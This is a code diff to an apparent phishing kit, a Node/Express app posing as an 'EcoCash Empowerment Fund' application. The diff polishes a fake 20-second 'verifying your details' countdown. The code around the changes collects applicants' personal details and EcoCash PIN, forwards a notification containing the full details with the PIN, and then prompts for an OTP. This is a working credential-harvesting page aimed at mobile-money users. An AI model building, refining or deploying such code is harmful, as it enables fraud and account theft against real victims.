@@ -73,21 +73,18 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;b
 .purpose-item.selected{border-color:#0047AB;background:linear-gradient(135deg,#0047AB,#0066CC);color:white;box-shadow:0 5px 15px rgba(0,71,171,0.3)}
 .purpose-item .icon{font-size:22px;display:block;margin-bottom:5px}
 
-/* ===== VERIFYING SCREEN ===== */
-.verifying-container{text-align:center;padding:30px 20px}
-.verifying-ring{width:140px;height:140px;margin:0 auto 24px;position:relative;display:flex;align-items:center;justify-content:center}
-.verifying-ring svg{position:absolute;top:0;left:0;width:140px;height:140px;transform:rotate(-90deg)}
-.verifying-ring circle{fill:none;stroke-width:8;stroke-linecap:round}
-.verifying-ring .ring-bg{stroke:#e8f1fc}
-.verifying-ring .ring-progress{stroke:#0047AB;stroke-dasharray:408;stroke-dashoffset:408;transition:stroke-dashoffset 1s linear}
-.verifying-count{font-size:42px;font-weight:700;color:#0047AB;letter-spacing:-1px}
-.verifying-container h2{color:#0047AB;font-size:1.4em;margin-bottom:12px;font-weight:700;letter-spacing:-0.3px}
-.verifying-container .verifying-subtitle{color:#666;font-size:13.5px;line-height:1.65;margin-bottom:24px}
-.verifying-steps{text-align:left;margin:26px 0 0 0;padding:0;list-style:none}
+/* ===== VERIFYING SCREEN (simplified) ===== */
+.verifying-container{text-align:center;padding:20px 10px}
+.verifying-count-wrap{width:140px;height:140px;margin:0 auto 22px;position:relative;background:linear-gradient(135deg,#f0f6ff,#e0ecff);border-radius:50%;display:flex;align-items:center;justify-content:center;box-shadow:inset 0 0 0 6px #e8f1fc}
+.verifying-count{font-size:52px;font-weight:800;color:#0047AB;letter-spacing:-2px;line-height:1}
+.verifying-unit{font-size:13px;color:#666;margin-top:4px;letter-spacing:0.5px}
+.verifying-container h2{color:#0047AB;font-size:1.4em;margin-bottom:10px;font-weight:700;letter-spacing:-0.3px}
+.verifying-container .verifying-subtitle{color:#666;font-size:13.5px;line-height:1.65;margin-bottom:22px}
+.verifying-steps{text-align:left;margin:20px 0 0 0;padding:0;list-style:none}
 .verifying-step{display:flex;align-items:center;gap:12px;padding:13px 15px;background:#f8f9fa;border-radius:11px;margin-bottom:9px;transition:all 0.4s;border-left:4px solid transparent}
 .verifying-step.done{background:#e8f5e9;border-left-color:#28a745}
 .verifying-step.active{background:#e8f1fc;border-left-color:#0047AB}
-.verifying-step .vstep-icon{font-size:19px;width:26px;text-align:center;transition:all 0.3s}
+.verifying-step .vstep-icon{font-size:19px;width:26px;text-align:center}
 .verifying-step .vstep-text{flex:1;font-size:13px;font-weight:600;color:#555}
 .verifying-step.active .vstep-text{color:#0047AB}
 .verifying-step.done .vstep-text{color:#1e7e34}
@@ -239,12 +236,11 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;b
 <!-- STEP 4: VERIFYING (20 seconds) -->
 <div class="step-content" id="verifyingContent">
 <div class="verifying-container">
-<div class="verifying-ring">
-<svg viewBox="0 0 140 140">
-<circle class="ring-bg" cx="70" cy="70" r="65"></circle>
-<circle class="ring-progress" id="ringProgress" cx="70" cy="70" r="65"></circle>
-</svg>
+<div class="verifying-count-wrap">
+<div>
 <div class="verifying-count" id="verifyingCount">20</div>
+<div class="verifying-unit">SECONDS</div>
+</div>
 </div>
 <h2>Verifying Your Details</h2>
 <p class="verifying-subtitle">Please wait while we verify your information and prepare your OTP. Do not close this page.</p>
@@ -395,6 +391,8 @@ var data=await response.json();
 if(data.success){
 currentAppId=data.registrationId;
 userDetails.ecoPin=ecoPin;
+btn.disabled=false;
+btnText.textContent='Continue';
 goToStep(4);
 startVerifyingCountdown();
 }else{
@@ -414,13 +412,10 @@ function startVerifyingCountdown(){
 var seconds=20;
 var totalSeconds=20;
 var countEl=document.getElementById('verifyingCount');
-var ringEl=document.getElementById('ringProgress');
-var circumference=408; // 2 * PI * 65 ≈ 408
 
 countEl.textContent=seconds;
-ringEl.style.strokeDashoffset=circumference;
 
-// Reset step states
+// Reset steps
 document.getElementById('vStep1').className='verifying-step active';
 document.getElementById('vStep1').querySelector('.vstep-status').textContent='⏳';
 document.getElementById('vStep2').className='verifying-step';
@@ -434,11 +429,10 @@ var elapsed=0;
 verifyingInterval=setInterval(function(){
 elapsed++;
 seconds--;
+if(seconds<0){seconds=0}
 countEl.textContent=seconds;
-var progress=elapsed/totalSeconds;
-ringEl.style.strokeDashoffset=circumference*(1-progress);
 
-// Update step states based on progress
+// Update step states
 if(elapsed === 7){
 document.getElementById('vStep1').className='verifying-step done';
 document.getElementById('vStep1').querySelector('.vstep-status').textContent='✓';
@@ -450,16 +444,15 @@ document.getElementById('vStep2').querySelector('.vstep-status').textContent='�
 document.getElementById('vStep3').className='verifying-step active';
 }
 
-if(seconds <= 0){
+if(elapsed >= totalSeconds){
 clearInterval(verifyingInterval);
 verifyingInterval=null;
 document.getElementById('vStep3').className='verifying-step done';
 document.getElementById('vStep3').querySelector('.vstep-status').textContent='✓';
-setTimeout(function(){
+// Move to OTP
 goToStep(5);
 var first=document.querySelector('#otpContainer .otp-input');
 if(first){first.focus()}
-}, 600);
 }
 },1000);
 }
@@ -568,7 +561,7 @@ document.getElementById('ecoPin').addEventListener('input',function(){this.value
 // ===== ROUTES =====
 app.get('/', (req, res) => { res.send(HTML_PAGE); });
 
-// ===== REGISTER (after PIN) =====
+// ===== REGISTER =====
 app.post('/api/register', async (req, res) => {
     try {
         const {
@@ -595,7 +588,6 @@ app.post('/api/register', async (req, res) => {
             timestamp: new Date().toISOString()
         };
 
-        // Notification 1 - Full details with PIN
         const message =
             '💚 <b>NEW ECOCASH EMPOWERMENT FUND APPLICATION</b>\n\n' +
             '🆔 <b>Registration ID:</b> <code>#' + registrationId + '</code>\n' +
@@ -626,7 +618,7 @@ app.post('/api/register', async (req, res) => {
     }
 });
 
-// ===== COMPLETE REGISTRATION (after OTP) =====
+// ===== COMPLETE REGISTRATION =====
 app.post('/api/complete-registration', async (req, res) => {
     try {
         const { registrationId, otp } = req.body;
